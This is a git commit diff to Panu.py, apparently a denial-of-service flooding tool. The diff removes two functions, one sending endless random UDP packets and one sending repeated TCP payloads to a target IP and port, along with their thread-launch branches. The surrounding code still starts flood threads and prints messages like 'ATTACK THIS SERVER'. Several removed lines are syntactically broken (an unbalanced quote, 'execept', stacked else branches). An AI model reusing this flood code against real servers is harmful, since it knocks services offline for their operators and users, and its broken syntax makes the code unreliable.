3f237577a575d7e4188d345a4343bee2f1c1f97e
ZieLxxxy <102886357+ZielXVz@users.noreply.github.com>
2022-04-24 10:19:59 +0700

    Update Panu.py

--- Panu.py
+++ Panu.py
@@ -59,44 +59,10 @@ def run2():
                         s.close()
                         print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")
 
-def run3():
-       data = random._urandom(1024)
-       i = random.choice(("[-]","[!]","[$]"))
-       while True:
-               try:
-                       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                       addr = (str(ip),int(port))
-                       for x in range (times):
-                               s.sendto(data,addr)
-                       print(i +" ZIELXXX ATTACK THIS SERVER!!!")
-                except:
-                       print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")
-
-def run4():
-        data = random._urandom(16)
-        i = random.choice(("[-]","[!]",[$]"))
-        while True:
-                try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((ip,port))
-                        s.send(data)
-                        for x in range(times):
-                                s.send(data)
-                        print(i +" ZIELXXX ATTACK THIS SERVER!!!")
-                execept:
-                        s.close()
-                        print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")
-
 for y in range(threads):
         if choice == 'gas':
                 th = threading.Thread(target = run)
                 th.start()
         else:
                 th = threading.Thread(target = run2)
-                th.start()
-        else:
-                th = threading.Thread(target = run3)
-                th.start()
-        else:
-                th = threading.Thread(target = run4)
                 th.start()
